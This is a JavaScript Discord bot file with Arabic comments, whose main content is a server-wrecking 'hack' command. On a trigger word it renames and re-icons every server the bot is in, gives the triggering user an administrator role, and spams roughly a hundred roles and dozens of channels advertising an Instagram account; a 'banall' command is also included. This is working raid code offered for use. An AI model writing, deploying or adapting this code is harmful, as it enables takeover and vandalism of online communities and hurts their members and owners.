const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = "+";
const fs = require('fs');
const moment = require('moment');
const jimp = require('jimp');
const Canvas = require('canvas');


client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
});



client.on('message',async message => {
  if(message.content === 'banall') {
    var user = message.mentions.users.first();
    if(!message.member.hasPermission('ADMINISTRATOR')) return message.channel.send('❌|**\`ADMINISTRATOR\`لا توجد لديك صلاحية `**');
    if(!message.guild.member(client.user).hasPermission("BAN_MEMBERS")) return message.reply("**I Don't Have ` BAN_MEMBERS ` Permission**");
    const guild = message.guild;

  message.guild.fetchBans().then(ba => {
  ba.forEach(ns => {
  message.guild.ban(ns);
  const embed= new Discord.RichEmbed()
        .setColor("RANDOM")
        .setAuthor("Succes!", "https://images-ext-1.discordapp.net/external/vp2vj9m0ieU5J6SHg6ObIsGpTJyoZnGAebrd0_vi848/https/i.imgur.com/GnR2unD.png?width=455&height=455")
        .setDescription(`**:white_check_mark: Has Been Unban For All**`)
    .setFooter('Requested by '+message.author.username, message.author.avatarURL)
  message.channel.sendEmbed(embed);
  guild.owner.send(`سيرفر : ${guild.name}
  **تم تبنيد  الجميع بواسطة** : <@${message.author.id}>`) 
  });
  });
  }
  });






var x_x = "Hack" //هنا تحط الامر اللي يشغل الهاك

//اسم البوت واسم السيرفر وصورهم وكل شئ

client.on('message', message => {
 if (message.content === x_x) {
  client.user.setAvatar(`https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png`)

 }
});
client.on('message', message => {
 if (message.content === x_x) {
  client.user.setUsername("Come Here Instagram : mug1")

 }
});
client.on('message', message => {
 if (message.content === x_x) {
  client.user.setGame(`Come Here Instagram : mug1`, 'https://www.twitch.tv/hix')

 }
});

client.on('message', message => {
 if (message.content === x_x) {
  client.guilds.forEach(m => {
   m.setIcon(`https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png`)
  })
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  client.guilds.forEach(m => {
   m.setName(`Come Here Instagram : mug1`)
  })
 }
});

client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;

  message.guild.setIcon(`https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png`)

 }
});




//اللي يسوي رتب

client.on('message', message => {
 if (!message.channel.guild) return;

 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createRole({
   name: "Come Here Instagram : mug1",
   permissions: [8],
   color: "#23272a"
  }).then(function(role) {
   message.member.addRole(role);
  })
  message.guild.createRole({
   name: "Come Here Instagram : mug1",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Come Here Instagram : mug1 ",
   permissions: [1],
   color: "#ff0000"
  });


 }
});




//هنا اللي يسوي الرومات
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
  message.guild.createChannel('Come Here Instagram : mug1', 'voice');
  message.guild.createChannel('Come Here Instagram : mug1', 'text');
